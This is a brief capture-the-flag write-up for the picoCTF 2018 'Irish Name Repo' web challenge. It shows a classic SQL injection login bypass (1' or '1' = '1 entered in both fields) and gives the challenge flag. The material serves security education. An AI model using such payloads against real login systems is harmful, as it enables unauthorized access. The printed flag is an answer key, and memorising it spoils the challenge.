# Irish Name Repo

__PROBLEM__

There is a website running at http://2018shell1.picoctf.com:59464 ([link](http://2018shell1.picoctf.com:59464)). Do you think you can log us in? Try to see if you can login!

__HINT__

There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?

__SOLUTION__

If right after reading the hint the first thing that came to your mind was [`SQL injection`](https://en.wikipedia.org/wiki/SQL_injection) then you are on the right track.

Trying the [basic](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)) SQLi

```
$username = 1' or '1' = '1
$password = 1' or '1' = '1
```

and you'll get the flag.

FLAG - `picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}`
